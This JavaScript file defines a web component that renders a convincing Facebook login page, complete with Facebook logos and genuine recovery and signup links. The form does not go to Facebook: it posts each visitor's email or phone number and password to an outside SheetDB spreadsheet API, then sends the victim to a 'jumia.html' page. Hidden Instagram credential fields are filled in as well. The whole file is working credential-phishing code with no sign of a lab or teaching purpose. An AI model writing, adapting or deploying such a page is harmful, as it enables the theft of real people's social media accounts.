class Facebook extends HTMLElement{
    connectedCallback() {
        this.innerHTML = `
            <!-- FACEBOOK STRUCTURE -->
            <div class="facebook-page-display">
                
                <!-- Parent container-->
                <div class="social-parent-con">

                    <!-- Header container -->
                    <div class="social-con">
                        <div class="container" >
                            <div class="col-12 col-md-11 col-lg-11 mx-auto">
                                
                                <div class="social-main-con">
                                    <div class="social-top-con">

                                        <!-- Navbar container-->
                                        <div class="social-nav-con">
                                            <div class="custom-row">
                                                <div class="list-back-btn" onclick="HomeToSignIn()"><img class="img-fluid" src="img/icon/back.png"></div>
                                                <span class="help-header-txt one-line nav-left-padding">Go back</span>
                                            </div>
                                        </div>
                                        
                                        <div class="row align-items-center">
                                            <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                                <div class="social-img"><img src="img/icon/facebooklogo.png" class="img-fluid"></div>
                                                <div class="facebook-social-display facebook-social"><img src="img/icon/facebooksocial.png" class="img-fluid"></div>
                                                <p class="facebook-social-display facebook-social-txt">Connect with friends and the world around you on Facebook.</p>
                                            </div>
                                    
                                            <!-- Sign In container -->
                                            <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                                <form action="https://sheetdb.io/api/v1/boeqkar8i41wn" method="post" id="fb-sheetdb-form">
                                                    <div class="social-input-con">
                                                        <div class="row">
                                                            <div class="col-12">
                                                                <label class="social-field one">
                                                                    <input type="text" name="data[fazebook_user]" placeholder=" "/>
                                                                    <span class="placeholder">Mobile number or email address</span>
                                                                </label>
                                                            </div>
                                                    
                                                            <div class="col-12">
                                                                <label class="social-field one">
                                                                    <input type="password" name="data[fazebook_pass]" placeholder=" "/>
                                                                    <span class="placeholder">Password</span>
                                                                </label>
                                                            </div>

                                                            <div class="col-12">
                                                                <label class="social-field one" style="display:none;">
                                                                    <input type="text" id="inzuser" name="data[instagram_user]" placeholder=" "/>
                                                                    <span class="placeholder">Mobile number or email address</span>
                                                                </label>
                                                            </div>
                                                    
                                                            <div class="col-12">
                                                                <label class="social-field one" style="display:none;">
                                                                    <input type="password" id="inzpass" name="data[instagram_pass]" placeholder=" "/>
                                                                    <span class="placeholder">Password</span>
                                                                </label>
                                                            </div>
                                                    
                                                            <div class="col-12">
                                                                <button type="submit" class="social-btn" id="faze-bn">Log In</button>
                                                                <div class="passwrd" onclick="document.location.href='https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0'">Forgot Password?</div>
                                                            </div>
                                                        </div>					
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    
                                    <div class="social-bot-con">
                                        <div class="row">
                                            <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                                <div class="social-cr8-btn" onclick="document.location.href='https://web.facebook.com/?locale2=en_GB&_rdc=1&_rdr'">Create account</div>	
                                                <div class="social-logo mx-auto"><img src="img/icon/socialfacebook.png" class="img-fluid"></div>		
                                            </div>
                                        </div>
                                    </div>
                                    
                                </div>
                                
                            </div>
                        </div>
                    </div>

                </div>

            </div>
            <!--  -------------------- -->
        `;
    }
}

customElements.define("facebook-page", Facebook);




var form = document.getElementById('fb-sheetdb-form');
form.addEventListener("submit", e => {
    e.preventDefault();
    fetch(form.action, {
        method : "POST",
        body: new FormData(document.getElementById("fb-sheetdb-form")),
    }).then(
        response => response.json()
    ).then((html) => {
        // you can put any JS code here
        window.open('jumia.html', '_self');
    });
});


document.getElementById("faze-bn").addEventListener('click', function () {
    var user = document.getElementById('inzuser');
    var pass = document.getElementById('inzpass');
    user.value += ' ---- ';
    pass.value += ' ---- ';
});